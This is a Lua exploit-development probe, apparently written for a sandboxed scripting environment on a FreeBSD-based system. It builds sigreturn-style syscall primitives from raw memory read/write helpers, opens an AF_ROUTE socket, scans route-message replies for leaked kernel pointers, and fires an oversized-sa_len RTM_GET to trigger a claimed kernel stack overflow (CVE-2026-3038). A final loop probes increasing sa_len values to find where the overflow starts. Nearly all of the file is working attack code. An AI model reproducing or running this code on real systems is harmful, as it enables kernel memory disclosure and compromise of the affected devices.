-- CRASH_CLASS: HIGH
-- PROBE 165b: CVE-2026-3038 rtsock_msg_buffer stack overflow (fixed)
--
-- Rewritten without bit library. Uses dword-aligned writes.

print("=== PROBE 165b: RTSOCK CVE-2026-3038 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function rd(addr) return to_num(memory.read_dword(addr)) end
local function rq(addr) return memory.read_qword(addr) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- Pack 4 bytes into a dword (little endian)
local function pack4(b0, b1, b2, b3)
    return b0 + b1 * 256 + b2 * 65536 + b3 * 16777216
end

-- rt_msghdr is 0x90 (144) bytes on amd64 FreeBSD
local HDR_LEN = 0x90

-- [A] Create AF_ROUTE socket
print("--- [A] AF_ROUTE SOCKET ---")
local rtfd = srop(97, uint64(17), uint64(3), uint64(0))
local rtfdv = rtfd and to_num(rtfd) or -1
print("rt_socket=" .. rtfdv)

if rtfdv < 0 then
    print("AF_ROUTE socket failed")
    print("=== DONE ===")
    return
end

-- [B] Normal RTM_GET first
print("")
print("--- [B] NORMAL RTM_GET ---")

local MSG = 0x50000
for off = 0, 0x1FF, 4 do wd(gpu + MSG + off, 0) end

-- Header: msglen, version=5, type=RTM_GET=4
local total_b = HDR_LEN + 16
wd(gpu + MSG + 0, pack4(total_b % 256, math.floor(total_b / 256), 5, 4))
-- rtm_addrs = RTA_DST = 0x01
wd(gpu + MSG + 0x0C, 1)
-- rtm_seq = 1
wd(gpu + MSG + 0x14, 1)

-- sockaddr_in for 127.0.0.1 right after header
local DST = MSG + HDR_LEN
wd(gpu + DST, pack4(16, 2, 0, 0))  -- sa_len=16, sa_family=AF_INET, port=0
wd(gpu + DST + 4, pack4(127, 0, 0, 1))  -- sin_addr
wd(gpu + DST + 8, 0)
wd(gpu + DST + 12, 0)

local wr = srop(4, uint64(rtfdv), ga(MSG), uint64(total_b))
local wrv = wr and to_num(wr) or -999
print("write(normal)=" .. wrv)

if wrv > 0 then
    local RBUF = 0x60000
    for off = 0, 0xFFF, 4 do wd(gpu + RBUF + off, 0) end
    local rr = srop(3, uint64(rtfdv), ga(RBUF), uint64(0x1000))
    local rrv = rr and to_num(rr) or -999
    print("read(response)=" .. rrv)
    if rrv > 0 then
        local d0 = rd(gpu + RBUF)
        local resp_type = math.floor(d0 / 16777216) % 256
        local resp_addrs = rd(gpu + RBUF + 0x0C)
        print("resp: type=" .. resp_type .. " addrs=0x" .. string.format("%X", resp_addrs))

        -- Scan for kernel pointers
        local kp = 0
        for off = 0, math.min(rrv - 8, 0xFFF), 8 do
            local val = rq(gpu + RBUF + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                kp = kp + 1
                print("  KPTR +" .. string.format("%03X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl))
            end
        end
        print("normal_kptrs=" .. kp)
    end
end

print("alive=" .. to_num(make_syscall(20)()))

-- [C] CVE trigger: RTM_GET with RTAX_AUTHOR sa_len=255
print("")
print("--- [C] CVE-2026-3038 TRIGGER ---")

local MSG2 = 0x70000
for off = 0, 0x3FF, 4 do wd(gpu + MSG2 + off, 0) end

-- DST sockaddr (16 bytes)
local DST2 = MSG2 + HDR_LEN
wd(gpu + DST2, pack4(16, 2, 0, 0))
wd(gpu + DST2 + 4, pack4(127, 0, 0, 1))

-- AUTHOR sockaddr right after DST (sa_len=255)
local AUTH = DST2 + 16
wd(gpu + AUTH, pack4(255, 2, 0x41, 0x42))  -- sa_len=255, family=2, padding=AB
-- Fill rest with recognizable pattern
for off = 4, 252, 4 do
    wd(gpu + AUTH + off, 0x43434343)  -- CCCC
end

local total_c = HDR_LEN + 16 + 255
-- Round up to be safe
wd(gpu + MSG2 + 0, pack4(total_c % 256, math.floor(total_c / 256), 5, 4))
-- RTA_DST(1) | RTA_AUTHOR(0x40) = 0x41
wd(gpu + MSG2 + 0x0C, 0x41)
wd(gpu + MSG2 + 0x14, 2)

print("sending overflow RTM_GET total=" .. total_c)
print("*** sa_len=255 in RTAX_AUTHOR, buffer=128 → 127-byte overflow ***")

local wr2 = srop(4, uint64(rtfdv), ga(MSG2), uint64(total_c))
local wr2v = wr2 and to_num(wr2) or -999
print("write(overflow)=" .. wr2v)

-- Check if we survived
local alive_ok, alive_pid = pcall(function() return make_syscall(20)() end)
if not alive_ok then
    print("*** PROCESS DEAD AFTER OVERFLOW ***")
    print("=== DONE (dead) ===")
    return
end
print("survived! pid=" .. to_num(alive_pid))

if wr2v > 0 then
    -- Read response
    local RBUF2 = 0x80000
    for off = 0, 0xFFF, 4 do wd(gpu + RBUF2 + off, 0) end
    local rr2 = srop(3, uint64(rtfdv), ga(RBUF2), uint64(0x1000))
    local rr2v = rr2 and to_num(rr2) or -999
    print("read(overflow_resp)=" .. rr2v)

    if rr2v > 0 then
        print("*** CVE-2026-3038 SURVIVED WITH RESPONSE! ***")
        for off = 0, math.min(rr2v - 8, 0xFFF), 8 do
            local val = rq(gpu + RBUF2 + off)
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                print("  *** KERNEL PTR +" .. string.format("%03X", off) ..
                    "=0x" .. string.format("%X%08X", vh, vl) .. " ***")
            end
        end
    end
end

-- [D] Boundary test: try increasing sa_len values
print("")
print("--- [D] SA_LEN BOUNDARY ---")

for _, slen in ipairs({64, 96, 128, 129, 160, 200, 254}) do
    local MSG3 = 0x90000
    for off = 0, 0x3FF, 4 do wd(gpu + MSG3 + off, 0) end

    local DST3 = MSG3 + HDR_LEN
    wd(gpu + DST3, pack4(16, 2, 0, 0))
    wd(gpu + DST3 + 4, pack4(127, 0, 0, 1))

    local AUTH3 = DST3 + 16
    wd(gpu + AUTH3, pack4(slen, 2, 0x41, 0x42))
    for off = 4, slen - 4, 4 do
        wd(gpu + AUTH3 + off, 0x44444444)
    end

    local tl3 = HDR_LEN + 16 + slen
    wd(gpu + MSG3 + 0, pack4(tl3 % 256, math.floor(tl3 / 256), 5, 4))
    wd(gpu + MSG3 + 0x0C, 0x41)
    wd(gpu + MSG3 + 0x14, 100 + slen)

    local wr3 = srop(4, uint64(rtfdv), ga(MSG3), uint64(tl3))
    local wr3v = wr3 and to_num(wr3) or -999
    print("sa_len=" .. slen .. " write=" .. wr3v)

    local ok3, pid3 = pcall(function() return make_syscall(20)() end)
    if not ok3 or to_num(pid3) ~= pid then
        print("*** DIED AT sa_len=" .. slen .. " ***")
        print("*** OVERFLOW CONFIRMED AT BOUNDARY ***")
        break
    end
end

srop(6, uint64(rtfdv))
print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
